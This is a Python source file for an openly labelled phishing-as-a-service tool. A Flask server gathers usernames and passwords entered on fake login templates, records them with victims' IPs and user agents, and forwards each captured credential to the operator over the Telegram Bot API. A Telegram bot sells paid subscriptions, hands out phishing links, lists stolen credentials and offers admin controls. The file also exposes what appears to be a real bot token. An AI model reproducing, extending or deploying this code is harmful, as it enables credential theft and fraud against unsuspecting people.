#!/usr/bin/env python3
"""
PHISHING TOOL – Render Webhook Version
"""
import os
import sys
import time
import threading
import sqlite3
import socket
import logging
import requests
from datetime import datetime, timedelta
from flask import Flask, request, render_template, redirect, jsonify

# ---------- TELEGRAM IMPORTS ----------
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# ---------- CONFIG ----------
PORT = int(os.environ.get('PORT', 5000))
TEMPLATES_DIR = "templates"
DB_PATH = os.path.join(os.getcwd(), "instance", "creds.db")
BOT_TOKEN = os.environ.get('8872910300:AAGQpVHR6xV8Q2tQID3O0slmwGwTM7g2BYE')
ADMIN_IDS_RAW = os.environ.get("7482880661")
ADMIN_IDS = [int(x) for x in ADMIN_IDS_RAW.split(',') if x.strip().isdigit()]

# ---------- GLOBAL ----------
user_templates = {}
user_sessions = {}

# ---------- LOGGING ----------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------- FLASK APP ----------
app = Flask(__name__, template_folder=TEMPLATES_DIR)

# ---------- DATABASE ----------
def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            platform TEXT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            ip TEXT,
            user_agent TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            telegram_id INTEGER PRIMARY KEY,
            username TEXT,
            subscription_start DATETIME,
            subscription_end DATETIME,
            plan TEXT,
            is_admin INTEGER DEFAULT 0
        )
    ''')
    c.execute("PRAGMA table_info(credentials)")
    columns = [col[1] for col in c.fetchall()]
    if 'platform' not in columns:
        logger.info("Migrating credentials table: adding 'platform' column...")
        c.execute("ALTER TABLE credentials ADD COLUMN platform TEXT")
        conn.commit()
        logger.info("Migration complete.")
    conn.commit()
    conn.close()

def get_user(telegram_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE telegram_id = ?", (telegram_id,))
    user = c.fetchone()
    conn.close()
    return user

def create_user(telegram_id, username=None):
    now = datetime.now()
    end = now + timedelta(hours=24)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    is_admin = 1 if telegram_id in ADMIN_IDS else 0
    c.execute(
        "INSERT OR REPLACE INTO users (telegram_id, username, subscription_start, subscription_end, plan, is_admin) VALUES (?, ?, ?, ?, ?, ?)",
        (telegram_id, username, now, end, 'free_trial', is_admin)
    )
    conn.commit()
    conn.close()

def update_subscription(telegram_id, plan, days):
    now = datetime.now()
    end = now + timedelta(days=days)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "UPDATE users SET subscription_start = ?, subscription_end = ?, plan = ? WHERE telegram_id = ?",
        (now, end, plan, telegram_id)
    )
    conn.commit()
    conn.close()

def revoke_subscription(telegram_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute(
        "UPDATE users SET subscription_end = ?, plan = ? WHERE telegram_id = ?",
        (datetime.now(), 'none', telegram_id)
    )
    conn.commit()
    conn.close()

def is_subscribed(telegram_id):
    user = get_user(telegram_id)
    if not user:
        return False
    end = user[3]
    if end is None:
        return False
    try:
        return datetime.now() < datetime.fromisoformat(end)
    except:
        return False

# ---------- TELEGRAM ALERT ----------
def send_telegram_alert(platform, username, password, ip, ua, chat_id):
    if not BOT_TOKEN:
        return
    message = f"""
🔐 *New Credentials Captured!*

📱 *Platform:* {platform}
👤 *Username:* `{username}`
🔑 *Password:* `{password}`
🌐 *IP:* {ip}
🕒 *Time:* {time.strftime('%Y-%m-%d %H:%M:%S')}
📨 *User-Agent:* {ua[:60]}...
    """
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}, timeout=5)
    except Exception as e:
        logger.error(f"Alert failed: {e}")

# ---------- FLASK ROUTES ----------
@app.route('/')
def index():
    return "Bot is running! Send /start on Telegram."

@app.route('/ping')
def ping():
    return "OK", 200

@app.route('/login', methods=['POST'])
def login():
    platform = request.form.get('platform', 'unknown')
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    if username and password:
        ip = request.remote_addr
        ua = request.headers.get('User-Agent', '')
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('INSERT INTO credentials (platform, username, password, ip, user_agent) VALUES (?, ?, ?, ?, ?)',
                  (platform, username, password, ip, ua))
        conn.commit()
        if ADMIN_IDS:
            send_telegram_alert(platform, username, password, ip, ua, ADMIN_IDS[0])
        conn.close()
    return redirect('https://www.' + platform + '.com')

# ---------- TELEGRAM WEBHOOK ----------
# We'll set the webhook using /setwebhook endpoint internally
@app.route('/webhook', methods=['POST'])
async def webhook():
    if request.headers.get('content-type') == 'application/json':
        update = Update.de_json(request.get_json(), application.bot)
        await application.process_update(update)
        return "OK", 200
    return "Bad Request", 400

# ---------- TEMPLATE HELPERS ----------
def get_all_templates():
    if not os.path.exists(TEMPLATES_DIR):
        os.makedirs(TEMPLATES_DIR)
    files = [f for f in os.listdir(TEMPLATES_DIR) if f.endswith('.html')]
    return [f[:-5] for f in files]

# ---------- BOT COMMAND HANDLERS ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    uname = update.effective_user.username
    user = get_user(uid)
    if not user:
        create_user(uid, uname)
        user = get_user(uid)
    end = user[3]
    plan = user[4]
    status_text = "🆓 *Free Trial*" if plan == 'free_trial' else f"📦 *{plan} Plan*" if plan and plan != 'none' else "❌ No subscription"
    if end:
        try:
            remaining = (datetime.fromisoformat(end) - datetime.now())
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                time_left = f"{days}d {hours}h {minutes}m"
            else:
                time_left = "Expired"
        except:
            time_left = "Invalid"
    else:
        time_left = "N/A"
    user_temp = user_templates.get(uid)
    all_t = get_all_templates()
    template_msg = f"`{user_temp}`" if user_temp else f"`{all_t[0] if all_t else 'None'}`"
    await update.message.reply_text(
        f"🤖 *Phishing Tool Bot*\n\n"
        f"📋 *Your Template:* {template_msg}\n"
        f"💳 *Subscription:* {status_text}\n"
        f"⏳ *Time left:* {time_left}\n\n"
        "Commands:\n"
        "/templates - List available templates\n"
        "/select <name> - Choose a template\n"
        "/startserver - Start your server & get link\n"
        "/stopserver - Stop your server\n"
        "/buy - View purchase options\n"
        "/creds - Show last 5 captured credentials\n"
        "/status - Show current status\n"
        "/help - This message",
        parse_mode='Markdown'
    )

async def buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "💳 *Purchase Options*\n\n"
        "1 day  – 40\n"
        "7 days – 200\n"
        "30 days – 320\n\n"
        "To buy, contact the owner:\n"
        "[Owner](https://t.me/your_telegram_username)\n\n"
        "After payment, the admin will activate your subscription."
    )
    await update.message.reply_text(text, parse_mode='Markdown', disable_web_page_preview=True)

async def templates_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    all_templates = get_all_templates()
    if not all_templates:
        await update.message.reply_text("No templates found.")
        return
    msg = "📋 *Available templates:*\n" + "\n".join([f"• {t}" for t in all_templates])
    await update.message.reply_text(msg, parse_mode='Markdown')

async def select_template(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /select <template_name>\nExample: /select facebook")
        return
    name = context.args[0]
    all_templates = get_all_templates()
    if name not in all_templates:
        await update.message.reply_text(f"Template '{name}' not found.")
        return
    user_templates[uid] = name
    await update.message.reply_text(f"✅ Your template set to: `{name}`", parse_mode='Markdown')

async def start_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_subscribed(uid):
        await update.message.reply_text("❌ *No active subscription.* Use /buy or /start for trial.", parse_mode='Markdown')
        return
    if uid in user_sessions:
        session = user_sessions[uid]
        await update.message.reply_text(f"ℹ️ Server already running.\n🔗 *Link:* `{session['url']}`", parse_mode='Markdown')
        return
    base_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'localhost')}"
    unique_path = f"/{uid}"
    full_url = base_url + unique_path
    user_sessions[uid] = {'url': full_url, 'template': user_templates.get(uid, 'default')}
    await update.message.reply_text(
        f"✅ Your phishing link is ready!\n🔗 *Link:* `{full_url}`\n📋 *Template:* `{user_templates.get(uid, 'default')}`",
        parse_mode='Markdown'
    )

async def stop_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in user_sessions:
        del user_sessions[uid]
        await update.message.reply_text("🛑 Your server has been stopped.")
    else:
        await update.message.reply_text("ℹ️ You don't have a running server.")

async def show_creds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT id, platform, username, password, ip, timestamp FROM credentials ORDER BY timestamp DESC LIMIT 5').fetchall()
    conn.close()
    if not rows:
        await update.message.reply_text("No credentials captured yet.")
        return
    msg = "📋 *Last 5 captured credentials:*\n"
    for r in rows:
        msg += f"ID:{r[0]} | {r[1]} | `{r[2]}` | `{r[3]}` | {r[4]} | {r[5]}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = get_user(uid)
    if not user:
        await update.message.reply_text("Please /start first.")
        return
    end = user[3]
    plan = user[4]
    status_text = "🆓 Free Trial" if plan == 'free_trial' else f"📦 {plan} Plan" if plan and plan != 'none' else "❌ No subscription"
    if end:
        try:
            remaining = (datetime.fromisoformat(end) - datetime.now())
            if remaining.total_seconds() > 0:
                days = remaining.days
                hours = remaining.seconds // 3600
                minutes = (remaining.seconds % 3600) // 60
                time_left = f"{days}d {hours}h {minutes}m"
            else:
                time_left = "Expired"
        except:
            time_left = "Invalid"
    else:
        time_left = "N/A"
    user_temp = user_templates.get(uid, 'None')
    session_info = "Running" if uid in user_sessions else "Stopped"
    url = user_sessions[uid]['url'] if uid in user_sessions else "None"
    msg = (
        f"📊 *Your Status*\n"
        f"Template: `{user_temp}`\n"
        f"Subscription: {status_text}\n"
        f"Time left: {time_left}\n"
        f"Server: {session_info}\n"
        f"Link: `{url}`"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

# ---------- ADMIN COMMANDS ----------
async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    keyboard = [
        [InlineKeyboardButton("📋 List Users", callback_data='admin_list')],
        [InlineKeyboardButton("➕ Add/Extend Subscription", callback_data='admin_add')],
        [InlineKeyboardButton("❌ Revoke Subscription", callback_data='admin_revoke')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🔐 *Admin Panel*", parse_mode='Markdown', reply_markup=reply_markup)

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == 'admin_list':
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT telegram_id, username, plan, subscription_end FROM users ORDER BY telegram_id")
        rows = c.fetchall()
        conn.close()
        if not rows:
            await query.edit_message_text("No users found.")
            return
        msg = "👥 *Users List*\n\n"
        for r in rows:
            tid, uname, plan, end = r
            if end:
                try:
                    remaining = (datetime.fromisoformat(end) - datetime.now())
                    if remaining.total_seconds() > 0:
                        time_left = f"{remaining.days}d {remaining.seconds//3600}h"
                    else:
                        time_left = "Expired"
                except:
                    time_left = "Invalid"
            else:
                time_left = "N/A"
            msg += f"ID: `{tid}` | @{uname or 'N/A'} | Plan: {plan or 'none'} | Left: {time_left}\n"
        await query.edit_message_text(msg, parse_mode='Markdown')
    elif data == 'admin_add':
        await query.edit_message_text(
            "Send:\n`/grant <telegram_id> <plan>`\nPlans: 1day, 7day, 30day",
            parse_mode='Markdown'
        )
    elif data == 'admin_revoke':
        await query.edit_message_text(
            "Send:\n`/revoke <telegram_id>`",
            parse_mode='Markdown'
        )

async def grant_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /grant <telegram_id> <plan>\nPlans: 1day, 7day, 30day")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid ID.")
        return
    plan = context.args[1]
    plan_map = {'1day': 1, '7day': 7, '30day': 30}
    if plan not in plan_map:
        await update.message.reply_text("Invalid plan.")
        return
    days = plan_map[plan]
    user = get_user(target_id)
    if not user:
        create_user(target_id, None)
    update_subscription(target_id, plan, days)
    await update.message.reply_text(f"✅ Subscription for `{target_id}` set to {plan} plan.", parse_mode='Markdown')

async def revoke_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized.")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /revoke <telegram_id>")
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid ID.")
        return
    revoke_subscription(target_id)
    await update.message.reply_text(f"✅ Subscription for `{target_id}` revoked.", parse_mode='Markdown')

# ---------- SET UP WEBHOOK ----------
def set_webhook():
    if not BOT_TOKEN:
        logger.error("BOT_TOKEN not set!")
        return
    base_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}"
    if not base_url or base_url == "https://None":
        logger.error("RENDER_EXTERNAL_HOSTNAME not set. Using localhost for testing.")
        base_url = "http://localhost"
    webhook_url = f"{base_url}/webhook"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}"
    try:
        resp = requests.get(url)
        logger.info(f"Webhook set response: {resp.text}")
    except Exception as e:
        logger.error(f"Failed to set webhook: {e}")

# ---------- MAIN ----------
if __name__ == "__main__":
    init_db()
    print("="*50)
    print("      PHISHING TOOL – RENDER VERSION")
    print("="*50)
    all_templates = get_all_templates()
    if all_templates:
        print(f"Found templates: {', '.join(all_templates)}")
    else:
        print("[!] No templates found.")
    
    # Create the Application object (needed for webhook)
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    # Add handlers to the application
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("buy", buy))
    application.add_handler(CommandHandler("templates", templates_list))
    application.add_handler(CommandHandler("select", select_template))
    application.add_handler(CommandHandler("startserver", start_server))
    application.add_handler(CommandHandler("stopserver", stop_server))
    application.add_handler(CommandHandler("creds", show_creds))
    application.add_handler(CommandHandler("status", status_cmd))
    application.add_handler(CommandHandler("admin", admin))
    application.add_handler(CommandHandler("grant", grant_cmd))
    application.add_handler(CommandHandler("revoke", revoke_cmd))
    application.add_handler(CallbackQueryHandler(admin_callback, pattern='^admin_'))

    # Set webhook
    set_webhook()

    # Start Flask server
    print(f"Listening on port {PORT}...")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
